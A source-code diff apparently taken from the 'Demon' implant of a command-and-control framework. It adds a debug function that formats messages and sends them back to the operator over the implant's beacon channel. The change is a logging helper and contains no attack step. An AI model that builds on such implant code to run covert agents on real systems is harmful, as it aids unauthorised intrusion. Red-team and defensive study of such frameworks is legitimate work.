@@ -1258,7 +1258,39 @@ VOID volatile ___chkstk_ms(
         VOID
 ) { __asm__( "nop" ); }
 
-#if defined(SHELLCODE) && defined(DEBUG)
+#if defined(SEND_LOGS) && defined(DEBUG)
+
+VOID DemonPrintf( PCHAR fmt, ... )
+{
+    PPACKAGE    package              = NULL;
+    va_list     VaListArg            = 0;
+    PVOID       CallbackOutput       = NULL;
+    INT         CallbackSize         = 0;
+
+    if ( ! Instance.Session.Connected ) {
+        return;
+    }
+
+    package = PackageCreate( BEACON_OUTPUT );
+
+    va_start( VaListArg, fmt );
+
+    CallbackSize    = Instance.Win32.vsnprintf( NULL, 0, fmt, VaListArg );
+    CallbackOutput  = Instance.Win32.LocalAlloc( LPTR, CallbackSize );
+
+    Instance.Win32.vsnprintf( CallbackOutput, CallbackSize, fmt, VaListArg );
+
+    va_end( VaListArg );
+
+    PackageAddInt32( package, 0 ); // CALLBACK_OUTPUT
+    PackageAddBytes( package, CallbackOutput, CallbackSize );
+    PackageTransmit( package, NULL, NULL );
+
+    MemSet( CallbackOutput, 0, CallbackSize );
+    Instance.Win32.LocalFree( CallbackOutput );
+}
+
+#elif defined(SHELLCODE) && defined(DEBUG)
 
 VOID LogToConsole(
     IN LPCSTR fmt,
